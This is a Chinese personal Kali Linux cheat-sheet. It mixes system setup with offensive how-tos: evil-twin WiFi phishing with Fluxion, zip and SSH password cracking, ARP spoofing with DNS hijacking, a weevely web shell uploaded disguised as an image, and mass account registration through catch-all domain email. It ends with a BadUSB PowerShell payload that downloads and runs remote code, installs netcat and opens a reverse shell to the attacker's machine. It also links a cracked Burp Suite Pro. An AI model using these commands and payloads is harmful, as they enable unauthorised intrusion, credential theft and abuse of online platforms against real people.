# 1. 更换国内源

### （1）更新源

`vim /etc/apt/sources.list`**  

复制下面源码 选择一个  粘贴到里面，并把原来的源注释掉：

    deb http://mirrors.ustc.edu.cn/debian/ buster main contrib non-free
    deb http://mirrors.ustc.edu.cn/debian/ buster-updates main contrib non-free
    deb http://mirrors.ustc.edu.cn/debian/ buster-backports main contrib non-free
    deb http://mirrors.ustc.edu.cn/debian-security buster/updates main contrib non-free
    
    deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    
    deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    
    deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    
    deb http://mirrors.neusoft.edu.cn/kali> kali-rolling/main non-free contrib
    deb-src http://mirrors.neusoft.edu.cn/kali> kali-rolling/main non-free contrib
```bash
sudo apt-get update #更新软件列表
sudo apt-get upgrade #更新软件
合并为：
apt-get update && apt-get upgrade
sudo apt-get dist-upgrade #升级
sudo apt-get clean #删除缓存包
sudo apt-get autoclean #删除未安装的deb包
```

### （2）缺少pyrit，并且E :pyrit无法定位的问题：

手动安装pyrit

```bash
git clone https://github.com/hacker3983/pyrit-installer.git
```

```bash
 bash install.sh
```

### （3）出现存在软件包未满足依赖时：

有的比较老的博客提供镜像源的版本是bonic，你的系统版本可能比较新可能是focal， 直接复制别人的镜像源，版本代码对不上， 就会出错。

```bash
#运行：
apt --fix-broken install
```

![image-20240309000436276](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240309000436276.png?token=ANG32YAYUCDRH27QRDYTFQTF5M32A)

### （4）当出现更新源签名无效问题时：

![image-20240308222536760](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240308222536760.png?token=ANG32YFQKKYRTQEWKTWJSMDF5MXYE)

* 下载签名并且安装

  ```bash
  wget archive.kali.org/archive-key.asc     #root用户下
  
  apt-key add archive-key.asc
  ```

* 更新源和软件

  ```bash
  apt update -y && apt upgrade -y && apt clean
  
  OK！
  ```

# 2. kali必备安装

## 用户增加sudo权限

```bash
adduser kali	#增加kali用户
passwd kali		#修改kali用户密码
usermod --append --groups sudo kali	#将kali用户添加到sudo组（给kali sudo权限）
#可写为：
usermod -aG sudo kali
groups kali		#查看kali用户所在组
su kali			#切换到kali用户
sudo -l			#查看kali用户是否权限提高
```



## 更新软件

apt是新版本，apt-get是旧版本的包管理器。

```bash
apt update	#查看有新版本的包、依赖
apt list --upgradeable	#查看可升级软件、包、依赖
apt upgrade -y	#升级
apt-get clean	#清除下载的已安装过的软件包
```

## 安装vscode

```bash
#安装vscode
官网下载deb
apt install ./deb安装
#终端下打开vscode
code	#打开vscode
code .	#在当前目录打开vscode
code ./demo.py	#vscode打开demo.py文件
```

## ssh连接

```bash
#删除本身的ssh秘钥
rm -rf /etc/ssh/ssh_host_*
#重新生成密钥
dpkg-reconfigure openssh-server
#重启ssh服务
systemctl restart ssh
#宿主机连接。ssh的端口为22
ssh -p 端口 用户名@ip
#断开
logout
```

## 设置共享文件夹

通过ssh方式设置主机和Linux之间的共享文件夹。

在宿主机和Linux上都安装unison。

```bash
apt install unison -y
```

宿主机输入：

```bash
unison 本机文件夹路径 ssh://用户名@ip:端口//虚拟机文件夹路径
```

## 安装c++编译器

安装g++编译器的命令：

sudo apt-get install build-essential

执行完后，就完成了gcc,g++,make的安装。build-essential是一整套工具，gcc，libc等等。

通过“g++ -v”可以查看g++是否安装成功。

注：“sudo apt-get install build-essential –fix-missing”，这个命令是修补安装build-essential，即已安装了部分build-essential，但没有安装完全，此时可以使用该命令继续安装build-essential。

## 终端美化

* 安装[wezterm](https://wezfurlong.org/wezterm/install/linux.html)

* [配置](https://zhuanlan.zhihu.com/p/588576407)

  ```bash
  mkdir -p  ~/.config/wezterm/	
  ```

  下载文件wezterm.lua，并且将之放到wezterm文件夹里，再用命令行赋予可执行权限：

  ```bash
  chmod 777 ~/.config/wezterm/wezterm.lua
  ```


# 3. fluxion

## 1）安装

```bash
git clone git@github.com:FluxionNetwork/fluxion.git
./fluxion.sh -i
```

全部显示OK，否则检查软件源。

## 2）钓鱼WiFi

HandShake Snooper=>扫描2.4G信道=>选择WIFI_id=>重置攻击=>mdk4=>抓包成功会显示HandShake Snooper攻击完成

1选择攻击方式=>1创建WiFi=>重置攻击=>mdk3=>hostapd=>hash-cowpatty=>1使用抓到的hash=>2cowpatty验证=>1创建SSL证书

=>1断开原网络=>3Chinese=>出现6个窗口表示成功

# 4. 生成字典

```bash
crunch <min> <max> [options]	#min和max是生成的密码的最少、最长位数
```

示例：

```bash
crunch 2 3 012345 -o ./aaa.txt
```

# 5. 爆破密码

爆破法破解：纯数字密码不超过十位的话还有希望，带标点的基本就不用试了，要是再带字母。

## 1）**解压缩全能王这样的云解密软件，只要服务器上存储有压缩包密码就可以获取。这种方法成功率最高。**

## 2）hashcat破解

* 获得压缩包hash-code

  ```bash
  zip2john aaa.zip > hash_code.txt
  ```

* 从aaa.txt中复制字符串前一部分到网站hashcat找到字符对应的hash-mode

  hashcat：https://hashcat.net/wiki/doku.php?id=example_hashes

* 破解

  ```bash
  hashcat -a 3 -m <hash-mode> hash_code.txt --increment ?d?d?d?d?d?d -o ./password.txt
  #-a 表示破解模式
  #6个?d表示六个纯数字
  ```

![image-20240310195450608](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240310195450608.png?token=ANG32YCCQWUZLPOUADHQSE3F5WQB2)

![image-20240310195523847](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240310195523847.png?token=ANG32YGJ5VAV3XVRDUBLS2LF5WQDO)

## 3）john破解

```bash
zip2john aaa.zip > hash_code.txt
john hash_code.txt
```

# 6. hydra爆破服务用户名和密码

**支持服务：ssh、telnet、ftp、MySQL、RDP(端口3389)**

`hydra 参数 IP 服务名`

| -    | -                                            |
| ---- | -------------------------------------------- |
| -l   | 指定登录用户名                               |
| -L   | 用户名字典（按照字典文件中用户名的顺序爆破） |
| -p   | 指定密码                                     |
| -P   | 密码字典                                     |
| -s   | 指定端口                                     |
| -t   | 设置线程数                                   |
| -o   | 输出文件                                     |
| -vV  | 显示详细过程                                 |

```bash
hydra -l root -P ./password.txt -t 4 -vV -s 22 127.0.0.1 ssh	##爆破ssh登录密码
hydra -L /usernameDict.txt -P ./password.txt -t 4 -vV -s 22 127.0.0.1 ssh	##爆破ssh登录密码
```

# 7. 中间人攻击

https://blog.csdn.net/m0_74806866/article/details/134853842

中间人（MITM）攻击在计算机出现之前就已经存在。这种类型的攻击包括攻击者将自己插入到相互通信的双方之间。中间人攻击本质上是窃听攻击。

```bash
ettercap -G
```

### 1）arp攻击断网

```bash
arpspoof -i eth0(网卡名) -t 靶机ip 网关
```

### 2）DNS劫持

* 在攻击机上启动Apache2服务：

  ```bash
  systemctl start apache2
  ```

* 修改ettercap配置文件。添加一条记录将域名指向攻击机IP：

  ```bash
  vim /etc/ettercap/etter.dns
  www.baidu.com	A	攻击机IP
  ```

  ![image-20240311011517517](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240311011517517.png)

* 开始

  ```bash
  ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /靶机IP// /网关// ；
  ```

  靶机解析www.baidu.com域名时跳转到攻击机IP。

# 8. BrupSuite

安装：

​			[burp_suite_pro_v2023.10.zip](https://zhuanlan.zhihu.com/p/671358251)

​			https://blog.csdn.net/xf555er/article/details/130452476

​			https://www.52pojie.cn/thread-1544866-1-1.html

设置：settings->在搜索栏搜索需要的功能

隐匿IP：https://blog.csdn.net/dust_hk/article/details/117071784

# 9.  OWASPBWA--靶机搭建

https://blog.csdn.net/qq_53079406/article/details/123862255



# 10. weevely-文件上传漏洞利用

* 生成带密码的php文件

  ```bash
  weevely generate <password> <path>
  ```

* 将生成的php文件修改为.png（其他文件类型也行）

* 将php文件上传到目标网站（服务器），连接php文件获得服务器shell

  ```bash
  weevely <url> <password>	#url指目标服务器该文件的路径
  ```

* 输入help可查看更多操作

# 11. 无限邮箱生成

使用域名邮箱，在某平台大量注册账号。

* NameSilo网站购买域名。已有域名可跳过。

  搜索域名获得库存和价格，纯数字域名性价比较高。也可以购买自定义域名。

  

* 登录[CloudFlare](https://dash.cloudflare.com/)网站。

  ![image-20240317210722923](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317210722923.png)

* 将购买的域名填入CloudFlare。

  ![image-20240317210820923](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317210820923.png)

* 选择CloudFlare对个人的免费计划。

  跳过DNS记录设置。

* 

![image-20240317211055203](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211055203.png)

![image-20240317211133223](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211133223.png)

![image-20240317211156012](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211156012.png)

![image-20240317211408381](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211408381.png)

个人信息可任意填写，但邮箱地址必须填写自己的收件邮箱：

![image-20240317211427919](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211427919.png)

点击生效检查：

![image-20240317211540393](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211540393.png)

30min后刷新页面，出现以下页面表示生效成功：

![image-20240317211713540](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211713540.png)

点击电子邮件：

![image-20240317211831120](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211831120.png)

![image-20240317211854869](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211854869.png)

填写临时邮箱邮件转发到的邮箱地址（填写**常用邮箱**）： 

在邮箱内通过邮件验证：

![image-20240317211930181](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317211930181.png)

设置路由规则，启用Catch-All状态。点击右侧”编辑“，编辑路由规则，选择“发送到电子邮件”。

![image-20240317215432950](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317215432950.png)

目标位置填写上面填写的**常用邮箱**，点击保存。

![image-20240317215639959](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317215639959.png)

* 至此，所有形如`XXX@域名`（这里的域名是在CloudFlare申请的域名）的**域名邮箱**收到的邮件，都会被cloudflare的电子邮件路由负责转发到上面填写的**常用邮箱**。

# 12. 蓝牙攻击

## 1）Bluetooth DDos Attach

在目标设备范围内，向其发送数据包/连接请求，令其无法工作或无法连接设备。

适用于没有rate limiting或implement sophisticated connection management的设备。

## 2）蓝牙模拟攻击

bluetooth impersonation attack

模拟目标设备的已信任的设备。需要知道已信任设备的信息。

## 3）HID Spoofing Attack

模拟蓝牙键盘，欺骗目标设备以为连接至一个合法设备。可远程控制目标设备，并执行恶意命令。

## 4）蓝牙拦截攻击

bluetooth interception attack

## 5）BlueBorne攻击

不具有广泛适用性，针对操作系统漏洞，但很多设备在旧版本系统上运行。

## 6）工具

* spooftooph——列出蓝牙设备，以及获取蓝牙设备名称、蓝牙地址等信息。

  Kali自带

* btscanner——无需配对目标设备，从中提取设备信息

  `sudo apt install btscanner`

* RedFang——发现隐藏蓝牙设备

  ```bash
  sudo apt install redfang
  ```

  ![image-20240317223156649](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240317223156649.png)

* BlueRanger——获取蓝牙设备范围、位置

* BetterCap

* BTLEJUICE

* BTLEJACK



## 7）蓝牙DDoS攻击

https://www.mzbky.com/1376.html#:~:text=%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Kali%20Linux%E4%BE%A6%E5%90%AC%E8%93%9D%E7%89%99%E8%AE%BE%E5%A4%87%201%20%E6%AD%A5%E9%AA%A41%20%E4%BD%BF%E7%94%A8hciconfig%E5%90%AF%E7%94%A8%E8%93%9D%E7%89%99%E9%80%82%E9%85%8D%E5%99%A8%20%E5%A6%82%E6%9E%9C%E6%82%A8%E7%86%9F%E6%82%89%E7%94%A8%E4%BA%8EWi-Fi%E5%8D%A1%E5%92%8C%E9%80%82%E9%85%8D%E5%99%A8%E7%9A%84%20ifconfig%20%EF%BC%8C%E9%82%A3%E4%B9%88%E8%BF%98%E6%9C%89%E5%8F%A6%E4%B8%80%E4%B8%AA%E4%B8%8E%E8%93%9D%E7%89%99%E8%AE%BE%E5%A4%87%E7%9B%B8%E4%BC%BC%E7%9A%84%E5%B7%A5%E5%85%B7%E3%80%82,%20%20%20%20%20%20HCITOOL%281%29%20

https://blog.csdn.net/u010764600/article/details/119684001

https://hackmag.com/security/bluetooth-ddos/

https://blog.csdn.net/qq_42378173/article/details/129013781

## 8）配合msf蓝牙渗透手机



https://www.cnblogs.com/webapplee/p/4060322.html

# 13. MetaSploit（msf)

安装：

kali集成在系统内，只能通过apt update -y && apt upgrade -y软件全部更新来更新。

```bash
apt-get install metasploit-framework
```

手机渗透：

https://blog.csdn.net/weixin_44664189/article/details/122711694

https://blog.csdn.net/weixin_45588247/article/details/119614618

# 14. 永恒之蓝漏洞

win7系统的漏洞。

# 15. VM虚拟机磁盘扩展

https://blog.csdn.net/hktkfly6/article/details/123302335

# 16. 设置代理IP

[Windows设置代理](https://zhuanlan.zhihu.com/p/486039122#:~:text=%E9%A6%96%E5%85%88%E7%82%B9%E5%87%BB%E6%A1%8C%E9%9D%A2%E5%8F%B3%E4%B8%8B%E8%A7%92%E7%9A%84%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%9B%BE%E6%A0%87%EF%BC%8C%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%EF%BC%9A%20%E7%84%B6%E5%90%8E%E7%82%B9%E5%87%BB%E2%80%9C%E7%BD%91%E7%BB%9C%E5%92%8CInternet%E8%AE%BE%E7%BD%AE%E9%80%89%E9%A1%B9%E2%80%9D%EF%BC%8C%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E9%80%90%E6%AD%A5%E6%93%8D%E4%BD%9C%EF%BC%8C%E4%B8%8B%E5%9B%BE%E5%B7%B2%E7%BB%8F%E6%A0%87%E6%B3%A8%E5%87%BA%E6%AD%A5%E9%AA%A4%EF%BC%9A%201%E3%80%81%E7%82%B9%E5%87%BB%E4%BB%A3%E7%90%86%3B,2%E3%80%81%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%89%E6%8B%A9%E4%B8%BA%E5%BC%80%3B%203%E3%80%81%E8%BE%93%E5%85%A5ip%E5%92%8C%E7%AB%AF%E5%8F%A3%3B%204%E3%80%81%E7%82%B9%E5%87%BB%E4%BF%9D%E5%AD%98%E3%80%82)

国内免费代理IP：https://zhuanlan.zhihu.com/p/395461277

# 17. ngrok内网穿透

通过内网穿透，可以公网ip替代私网ip，使用公网ip访问该服务。

**该程序需一直保持运行，程序关闭，映射也将关闭。**如果需要关闭映射，可以使用ctrl + c 或关闭该界面，进行程序终止。每次重新执行命令，映射外网的域名都会发生改变。如果希望域名不变，可通过开通[ngrok](https://so.csdn.net/so/search?q=ngrok&spm=1001.2101.3001.7020)的会员服务，具体可在官网进行查看。

安装方法自行搜索。

在官网ngrok.org无法注册。

# 18. 树莓派pico制作bad usb

获取Windows的powershell管理员权限。

流程：

* 删除pico内文件，拷贝bad usb固件到其中。pico会自动断连并重新连接。
* 连接后，删除所有文件。将bad usb目录文件拷贝其中。其中padload.dd文件为powershell脚本。
* 在kali以`nc -lvnp <port>`监听靶机的反向shell。
* 下面脚本的`kaliIP`可以通过ngrok内网穿透成域名。从而让不在局域网内的kali获得权限

```powershell
DELAY 200
GUI r

DELAY 200
STRING powershell -NoP -NonI #-W hidden可隐藏powershell
CTRL SHIFT ENTER

DELAY 500
LEFTARROW
ENTER

DELAY 500
STRING Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
ENTER

DELAY 200
STRING choco install netcat
DELAY 200
ENTER
STRING Y
ENTER
STRING nc -e powershell.exe <kaliIP> 4444<port>	
ENTER
```

# 19. MAC地址隐藏

**macchanger工具**

给网络设备（网络端口wlan0）修改临时MAC。

```bash
sudo apt-get install macchanger
```

```bash
#停用wlan0端口
airmon-ng stop wlan0
ifconfig wlan0 down
```

```bash
#macchanger随机生成MAC地址分配给网络端口
macchanger -r wlan0		
```

```bash
#重启端口
ifconfig wlan0 up
airmon-ng start wlan0
```



